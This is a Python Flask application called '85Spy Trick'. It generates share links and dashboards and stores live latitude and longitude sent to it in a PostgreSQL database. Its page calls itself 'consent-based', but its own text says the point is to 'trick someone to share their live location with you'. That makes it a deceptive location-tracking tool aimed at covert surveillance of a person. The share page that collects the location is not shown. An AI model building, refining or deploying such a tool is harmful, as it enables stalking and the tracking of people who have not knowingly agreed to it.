import os
import secrets
from datetime import datetime, timezone

import psycopg
from flask import Flask, jsonify, render_template, request


app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL")


def get_db():
    if not DATABASE_URL:
        raise RuntimeError("DATABASE_URL environment variable is not set.")

    return psycopg.connect(DATABASE_URL)


def initialize_database():
    connection = get_db()

    with connection.cursor() as cursor:
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id SERIAL PRIMARY KEY,
                session_id TEXT UNIQUE NOT NULL,
                created_at TIMESTAMPTZ NOT NULL
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS locations (
                id SERIAL PRIMARY KEY,
                session_id TEXT NOT NULL,
                latitude DOUBLE PRECISION NOT NULL,
                longitude DOUBLE PRECISION NOT NULL,
                accuracy DOUBLE PRECISION,
                created_at TIMESTAMPTZ NOT NULL
            )
        """)

    connection.commit()
    connection.close()


def session_exists(session_id):
    connection = get_db()

    with connection.cursor() as cursor:
        cursor.execute(
            """
            SELECT session_id
            FROM sessions
            WHERE session_id = %s
            """,
            (session_id,)
        )

        session = cursor.fetchone()

    connection.close()

    return session is not None


@app.route("/")
def home():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <title>85Spy Trick</title>

        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            body {
                min-height: 100vh;
                font-family: Arial, sans-serif;
                background:
                    radial-gradient(
                        circle at top left,
                        #172554,
                        transparent 40%
                    ),
                    radial-gradient(
                        circle at bottom right,
                        #0f766e,
                        transparent 35%
                    ),
                    #050816;
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 30px;
            }

            .container {
                width: 100%;
                max-width: 900px;
            }

            nav {
                display: flex;
                align-items: center;
                justify-content: space-between;
                margin-bottom: 80px;
            }

            .logo {
                font-size: 24px;
                font-weight: 800;
                letter-spacing: -1px;
            }

            .logo span {
                color: #38bdf8;
            }

            .status {
                display: flex;
                align-items: center;
                gap: 8px;
                color: #94a3b8;
                font-size: 14px;
            }

            .dot {
                width: 8px;
                height: 8px;
                background: #22c55e;
                border-radius: 50%;
                box-shadow: 0 0 12px #22c55e;
            }

            .hero {
                text-align: center;
            }

            .badge {
                display: inline-block;
                padding: 8px 14px;
                border: 1px solid rgba(56, 189, 248, 0.25);
                background: rgba(56, 189, 248, 0.08);
                border-radius: 999px;
                color: #7dd3fc;
                font-size: 13px;
                margin-bottom: 24px;
            }

            h1 {
                font-size: clamp(48px, 8vw, 86px);
                line-height: 0.95;
                letter-spacing: -5px;
                margin-bottom: 25px;
            }

            h1 span {
                color: #38bdf8;
            }

            .subtitle {
                max-width: 600px;
                margin: 0 auto;
                color: #94a3b8;
                font-size: 18px;
                line-height: 1.7;
            }

            .action {
                margin-top: 45px;
            }

            button {
                border: none;
                padding: 17px 30px;
                border-radius: 14px;
                background: #38bdf8;
                color: #03111c;
                font-size: 16px;
                font-weight: 700;
                cursor: pointer;
                transition: 0.2s ease;
                box-shadow: 0 10px 35px rgba(56, 189, 248, 0.25);
            }

            button:hover {
                transform: translateY(-2px);
                background: #7dd3fc;
                box-shadow: 0 15px 40px rgba(56, 189, 248, 0.35);
            }

            button:disabled {
                opacity: 0.6;
                cursor: not-allowed;
                transform: none;
            }

            #result {
                display: none;
                margin: 50px auto 0;
                max-width: 650px;
                padding: 30px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                background: rgba(15, 23, 42, 0.7);
                backdrop-filter: blur(20px);
                border-radius: 22px;
                text-align: left;
            }

            #result h2 {
                margin-bottom: 20px;
            }

            .link-box {
                margin-top: 18px;
                padding: 16px;
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
            }

            .link-label {
                display: block;
                color: #64748b;
                font-size: 12px;
                margin-bottom: 8px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }

            a {
                color: #7dd3fc;
                text-decoration: none;
                word-break: break-all;
            }

            a:hover {
                text-decoration: underline;
            }

            footer {
                margin-top: 70px;
                text-align: center;
                color: #475569;
                font-size: 13px;
            }

            @media (max-width: 600px) {
                body {
                    padding: 20px;
                }

                nav {
                    margin-bottom: 60px;
                }

                h1 {
                    letter-spacing: -3px;
                }

                .subtitle {
                    font-size: 16px;
                }

                #result {
                    padding: 22px;
                }
            }
        </style>
    </head>

    <body>

        <main class="container">

            <nav>
                <div class="logo">
                    85<span>Spy Trick</span>
                </div>

                <div class="status">
                    <span class="dot"></span>
                    System Online
                </div>
            </nav>

            <section class="hero">

                <div class="badge">
                    CONSENT-BASED LOCATION TRACKER
                </div>

                <h1>
                    Access location.<br>
                    <span>Live.</span>
                </h1>

                <p class="subtitle">
                    Create a secure session and trick someone to share their live location with you.
                </p>

                <div class="action">
                    <button id="createButton">
                        Create Location Session
                    </button>
                </div>

                <div id="result">

                    <h2>Session Ready</h2>

                    <div class="link-box">

                        <span class="link-label">
                            Share link now
                        </span>

                        <a
                            id="shareLink"
                            target="_blank">
                        </a>

                    </div>

                    <div class="link-box">

                        <span class="link-label">
                            Dashboard
                        </span>

                        <a
                            id="dashboardLink"
                            target="_blank">
                        </a>

                    </div>

                </div>

            </section>

            <footer>
                85Spy Trick · Location live tracking with consent
            </footer>

        </main>

        <script>
            const createButton =
                document.getElementById("createButton");

            const result =
                document.getElementById("result");

            const shareLink =
                document.getElementById("shareLink");

            const dashboardLink =
                document.getElementById("dashboardLink");

            createButton.addEventListener(
                "click",
                async () => {

                    createButton.disabled = true;

                    createButton.textContent =
                        "Creating Session...";

                    try {

                        const response =
                            await fetch(
                                "/api/sessions",
                                {
                                    method: "POST"
                                }
                            );

                        const data =
                            await response.json();

                        if (!response.ok) {
                            throw new Error(
                                "Session creation failed"
                            );
                        }

                        const baseUrl =
                            window.location.origin;

                        const shareUrl =
                            baseUrl + data.share_url;

                        const dashboardUrl =
                            baseUrl + data.dashboard_url;

                        shareLink.href =
                            shareUrl;

                        shareLink.textContent =
                            shareUrl;

                        dashboardLink.href =
                            dashboardUrl;

                        dashboardLink.textContent =
                            dashboardUrl;

                        result.style.display =
                            "block";

                    } catch (error) {

                        alert(
                            "Unable to create session."
                        );

                    } finally {

                        createButton.disabled =
                            false;

                        createButton.textContent =
                            "Create Location Session";
                    }
                }
            );
        </script>

    </body>
    </html>
    """


@app.route("/api/sessions", methods=["POST"])
def create_session():
    session_id = secrets.token_urlsafe(24)

    connection = get_db()

    with connection.cursor() as cursor:
        cursor.execute(
            """
            INSERT INTO sessions (
                session_id,
                created_at
            )
            VALUES (%s, %s)
            """,
            (
                session_id,
                datetime.now(timezone.utc)
            )
        )

    connection.commit()
    connection.close()

    return jsonify({
        "session_id": session_id,
        "share_url": f"/share/{session_id}",
        "dashboard_url": f"/dashboard/{session_id}"
    })


@app.route("/share/<session_id>")
def share_page(session_id):
    if not session_exists(session_id):
        return "Session not found.", 404

    return render_template(
        "share.html",
        session_id=session_id
    )


@app.route("/dashboard/<session_id>")
def dashboard_page(session_id):
    if not session_exists(session_id):
        return "Session not found.", 404

    return render_template(
        "dashboard.html",
        session_id=session_id
    )


@app.route("/api/location/<session_id>", methods=["POST"])
def update_location(session_id):
    if not session_exists(session_id):
        return jsonify({
            "error": "Session not found"
        }), 404

    data = request.get_json(silent=True)

    if not data:
        return jsonify({
            "error": "JSON data is required"
        }), 400

    try:
        latitude = float(data["latitude"])
        longitude = float(data["longitude"])
        accuracy = data.get("accuracy")

        if accuracy is not None:
            accuracy = float(accuracy)

    except (KeyError, TypeError, ValueError):
        return jsonify({
            "error": "Invalid location data"
        }), 400

    if not -90 <= latitude <= 90:
        return jsonify({
            "error": "Invalid latitude"
        }), 400

    if not -180 <= longitude <= 180:
        return jsonify({
            "error": "Invalid longitude"
        }), 400

    connection = get_db()

    with connection.cursor() as cursor:
        cursor.execute(
            """
            INSERT INTO locations (
                session_id,
                latitude,
                longitude,
                accuracy,
                created_at
            )
            VALUES (%s, %s, %s, %s, %s)
            """,
            (
                session_id,
                latitude,
                longitude,
                accuracy,
                datetime.now(timezone.utc)
            )
        )

    connection.commit()
    connection.close()

    return jsonify({
        "success": True
    })


@app.route("/api/location/<session_id>", methods=["GET"])
def get_location(session_id):
    if not session_exists(session_id):
        return jsonify({
            "error": "Session not found"
        }), 404

    connection = get_db()

    with connection.cursor() as cursor:
        cursor.execute(
            """
            SELECT
                latitude,
                longitude,
                accuracy,
                created_at
            FROM locations
            WHERE session_id = %s
            ORDER BY id DESC
            LIMIT 1
            """,
            (session_id,)
        )

        location = cursor.fetchone()

    connection.close()

    if location is None:
        return jsonify({
            "location": None
        })

    return jsonify({
        "location": {
            "latitude": location[0],
            "longitude": location[1],
            "accuracy": location[2],
            "created_at": location[3].isoformat()
        }
    })


initialize_database()

if __name__ == "__main__":
    app.run(debug=True)